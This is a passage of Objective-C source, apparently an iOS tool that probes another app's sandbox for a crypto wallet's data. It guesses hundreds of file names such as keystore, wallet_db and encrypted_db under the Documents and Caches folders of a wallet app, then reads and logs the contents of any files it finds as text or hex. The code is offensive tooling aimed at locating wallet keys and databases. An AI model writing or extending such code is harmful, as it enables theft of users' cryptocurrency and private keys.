    }
    [log appendFormat:@"  Extensionless hits: %d\n", hits];

    // Part E: Probe INSIDE discovered directories (v33 — cache+db are DIRS)
    [log appendString:@"\n[Part E] Probe inside Documents/db/ + Documents/cache/ + bundle-id dir:\n"];
    hits = 0;
    const char *innerDirs[] = {
        "Documents/db/",
        "Documents/cache/",
        "Library/Caches/com.global.wallet.ios/",
        NULL
    };
    const char *dbNames[] = {
        "wallet","Wallet","WALLET","tpwallet","TPWallet","tp_wallet",
        "tron","TRON","Tron","trx","TRX",
        "eth","ETH","btc","BTC","sol","SOL","bsc","BSC","polygon",
        "global","Global","GLOBAL","global_wallet",
        "data","Data","DATA","db","DB","main","Main",
        "tokens","Tokens","TOKENS","accounts","Accounts",
        "keystore","KeyStore","key_store","KeyStore",
        "settings","config","Config","storage","Storage",
        "cache","Cache","default","Default",
        "wallet_data","wallet_db","tron_wallet","tron_data","tron_db",
        "token_data","token_db","chain_db","chain_data",
        "db_main","db_wallet","db_tron","db_token",
        "secure_db","encrypted_db","wallet_store",
        "trx_wallet","trx_data","eth_wallet","btc_wallet","sol_wallet",
        "multi_chain","global_wallet_db","global_db",
        "UserData","AppData","LocalData","CoreData","Model",
        NULL
    };
    const char *dbExts[] = {
        ".sqlite",".db",".sqlcipher",".encrypted",".sqlite3",
        ".dat",".bin",".idx",".key","",
        NULL
    };
    for (int di = 0; innerDirs[di]; di++) {
        for (int ni = 0; dbNames[ni]; ni++) {
            for (int ei = 0; dbExts[ei]; ei++) {
                NSString *rel = [NSString stringWithFormat:@"%s/%s%s%s",
                    [tpBase UTF8String], innerDirs[di], dbNames[ni], dbExts[ei]];
                NSString *fpFull = TRYFILE(rel);
                BOOL ex = [fm fileExistsAtPath:fpFull];
                if (ex) {
                    NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
                    unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
                    BOOL isDir = [attrs[NSFileType] isEqualToString:NSFileTypeDirectory];
                    [log appendFormat:@"  [+] %s%s%s (%llu bytes)%s\n",
                        innerDirs[di], dbNames[ni], dbExts[ei], sz, isDir ? " [DIR]" : ""];
                    hits++;
                }
            }
        }
    }
    [log appendFormat:@"  Hits: %d / %d probes\n", hits,
        (int)(sizeof(innerDirs)/sizeof(innerDirs[0])-1) *
        (int)(sizeof(dbNames)/sizeof(dbNames[0])-1) *
        (int)(sizeof(dbExts)/sizeof(dbExts[0])-1)];

    // Part F: Read content of any non-directory files found
    [log appendString:@"\n[Part F] Read contents of discovered files:\n"];
    hits = 0;
    for (int di = 0; innerDirs[di]; di++) {
        for (int ni = 0; dbNames[ni]; ni++) {
            for (int ei = 0; dbExts[ei]; ei++) {
                NSString *rel = [NSString stringWithFormat:@"%s/%s%s%s",
                    [tpBase UTF8String], innerDirs[di], dbNames[ni], dbExts[ei]];
                NSString *fpFull = TRYFILE(rel);
                BOOL ex = [fm fileExistsAtPath:fpFull];
                if (!ex) continue;
                BOOL isDir = NO;
                [fm fileExistsAtPath:fpFull isDirectory:&isDir];
                if (isDir) continue; // skip directories, only read real files
                NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
                unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
                [log appendFormat:@"\n  --- %s%s%s (%llu bytes) ---\n",
                    innerDirs[di], dbNames[ni], dbExts[ei], sz];
                // Use NSString for text, NSData for raw bytes
                NSError *err = nil;
                NSString *content = [NSString stringWithContentsOfFile:fpFull
                    encoding:NSUTF8StringEncoding error:&err];
                if (content) {
                    [log appendFormat:@"  UTF-8: %@\n",
                        [content substringToIndex:MIN(500, content.length)]];
                    hits++;
                } else {
                    NSData *data = [NSData dataWithContentsOfFile:fpFull];
                    if (data) {
                        const unsigned char *b = data.bytes;
                        NSUInteger dlen = MIN(64, data.length);
                        NSMutableString *hex = [NSMutableString string];
                        for (NSUInteger i = 0; i < dlen; i++)
                            [hex appendFormat:@"%02x ", b[i]];
                        [log appendFormat:@"  hex: %@\n", hex];
                        if (data.length >= 16 && memcmp(b, "SQLite format 3", 16) == 0)
                            [log appendString:@"  type: SQLite3\n"];
                        else if (data.length >= 6 && memcmp(b, "bplist", 6) == 0)
                            [log appendString:@"  type: binary plist\n"];
                        hits++;
                    } else {
                        [log appendString:@"  [-] read FAILED\n"];
                    }
                }
            }
        }
    }
    [log appendFormat:@"  Files read: %d\n", hits];

    dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
}

@end

